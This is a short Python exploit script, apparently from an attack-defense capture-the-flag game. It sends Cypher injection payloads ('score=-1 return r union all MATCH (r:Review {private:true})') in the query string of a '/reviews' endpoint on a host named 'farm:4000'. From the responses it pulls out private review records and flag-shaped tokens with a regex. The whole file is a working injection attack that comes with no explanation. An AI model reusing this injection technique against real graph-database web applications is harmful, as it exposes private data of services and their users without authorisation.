#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests
import string, random, uuid

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

#ip = sys.argv[1]
ip = 'farm' + ':4000'
url = 'http://{}'.format(ip)

s = requests.Session()

#s.post(url + '', timeout=(None,None))
html = s.get(url + '/reviews?planetPerwana&score=-1 return r union all MATCH (r:Review {private:true})', timeout=(None,None)).text
print(re.findall('[A-Z0-9]{31}=',html), flush=True)
html = s.get(url + '/reviews?planetArkas&score=-1 return r union all MATCH (r:Review {private:true})', timeout=(None,None)).text
print(re.findall('[A-Z0-9]{31}=',html), flush=True)